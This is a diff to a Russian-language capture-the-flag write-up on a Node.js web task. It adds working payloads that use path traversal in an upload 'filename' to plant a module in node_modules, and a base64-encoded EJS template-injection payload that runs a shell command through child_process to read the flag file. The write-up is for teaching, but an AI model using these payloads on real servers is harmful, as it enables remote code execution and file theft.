@@ -157,7 +157,11 @@
 `filename:"../views/exp.ejs/a/.." // доступ к файлу ?templ=/app/views/exp.ejs`
 2. внезапный вариант с `.ejs`
 `filename:"../views/.ejs"      // доступ к файлу ?templ=/app/views/`
-3. загрузка `.node` файла
+3. загрузка нового модуля в `node_modules`:
+`{"filename":"../views/pwned.pwned","filedata":"dGVzdAo="}`
+`{"filename":"../node_modules/pwned","filedata":"ZnVuY3Rpb24gX19leHByZXNzKCkgewogICAgY29uc29sZS5sb2coJ3B3bmVkYicpOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsgX19leHByZXNzIH07"}`
+вызов `/?templ=pwned.pwned`
+4. загрузка `.node` файла
 это [документированная фича](https://nodejs.org/api/modules.html) Node.js
 
 > If the exact filename is not found, then Node.js will attempt to load
@@ -176,8 +180,8 @@
 
     npm install node-gyp && ./node_modules/.bin/node-gyp configure && ./node_modules/.bin/node-gyp build
 
-Почти никто не решил задание по третьему пути, все решали одним из первых двух. Пример полного JSON с SSTI для получения флага из енвов:
+Почти никто не решил задание по четвертому вектору, в основном, решали по одному из первых двух. Пример полного JSON с SSTI для чтения флага из файла:
 
-    {"filename":"../views/exp.ejs","filedata":"PCU9IHByb2Nlc3MuZW52LkZMQUcgJT4="}
+    {'filename': '../views/.ejs', 'filedata': 'CjwlCiAgY29uc3QgY3AgPSAoRnVuY3Rpb24oJ3JldHVybiBwcm9jZXNzJykpKCkubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CiAgY29uc3QgZGF0YSA9IGNwLmV4ZWNTeW5jKCdjYXQgL2ZmZmZmZmZsYWcnLCAndXRmOCcpOwolPgo8cHJlPjwlPSBkYXRhICU+PC9wcmU+Cg=='}
 
 #web #node #jwt #ssti
